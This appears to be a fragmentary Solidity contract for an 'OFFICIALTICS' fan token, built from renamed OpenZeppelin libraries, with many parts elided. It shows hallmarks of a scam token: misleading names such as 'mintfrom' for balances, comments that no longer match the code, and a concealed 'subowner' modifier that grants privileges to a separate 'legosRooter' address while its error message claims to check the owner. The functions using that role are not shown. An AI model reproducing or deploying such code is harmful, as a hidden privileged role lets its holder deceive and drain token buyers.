...
/// https://x.com/OFFICIALTICS


pragma solidity 0.8.29;

// OFFICIALTICS fan token

interface OFFICIALTICSinterface {
  /**
...
/*
 * @dev Provides information about the current execution OFFICIALTICS20Burnable, including the
 ...
 */
abstract contract OFFICIALTICS20Burnable {
...
// File: @openzeppelin/contracts/access/OFFICIALTICS20Ownable.sol
 ...
 * the owner.
 */
abstract contract OFFICIALTICS20Ownable is OFFICIALTICS20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "OFFICIALTICS20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "OFFICIALTICS20Ownable: new owner is the zero address");
 ...
 * `SafeOFFICIALTICS` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeOFFICIALTICS {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeOFFICIALTICS: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeOFFICIALTICS: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeOFFICIALTICS: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeOFFICIALTICS: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeOFFICIALTICS: modulo by zero");
  }
...
contract OFFICIALTICSToken is OFFICIALTICS20Burnable, OFFICIALTICSinterface, OFFICIALTICS20Ownable {
    
    using SafeOFFICIALTICS for uint256;
    ...
    */
    ...
    /**
    * @dev See {OFFICIALTICSinterface-totalSupply}.
    */
    ...
    /**
    * @dev See {OFFICIALTICSinterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "OFFICIALTICS20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {OFFICIALTICSinterface-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {OFFICIALTICSinterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {OFFICIALTICSinterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {OFFICIALTICSinterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {OFFICIALTICSinterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "OFFICIALTICSinterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {OFFICIALTICSinterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "OFFICIALTICSinterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "OFFICIALTICSinterface: transfer from the zero address");
        require(shippingto != address(0), "OFFICIALTICSinterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "OFFICIALTICSinterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "OFFICIALTICSinterface: approve from the zero address");
        require(transporteur != address(0), "OFFICIALTICSinterface: approve to the zero address");
